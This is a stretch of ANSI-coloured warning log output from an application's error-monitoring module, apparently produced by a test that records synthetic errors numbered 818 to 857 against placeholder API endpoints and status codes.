WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727929Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 818'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727983Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 819'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 820'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 821'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 822'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728185Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 823'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728235Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 824'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 825'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 826'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 827'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 828'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 829'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728525Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 830'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 831'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 832'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 833'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 834'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 835'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728812Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 836'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728860Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 837'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 838'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.728956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 839'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 840'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729107Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 841'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 842'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 843'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 844'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 845'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 846'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 847'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 848'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 849'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 850'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 851'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 852'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729721Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 853'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 854'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 855'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 856'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 857'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
